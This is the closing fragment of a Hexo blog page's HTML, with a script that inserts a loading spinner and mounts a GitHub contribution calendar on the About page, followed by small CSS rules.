            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
            if(parent_div_git && location.pathname =='/about/'){
                console.log('已挂载github calendar')
                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
            };
            GithubCalendar(git_githubapiurl,git_color,git_user)
        }
        if(document.getElementById('recent-posts')){
            GithubCalendarConfig()
        }
    </script>
    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
    <style></style><!-- hexo injector body_end end --></body>
</html>
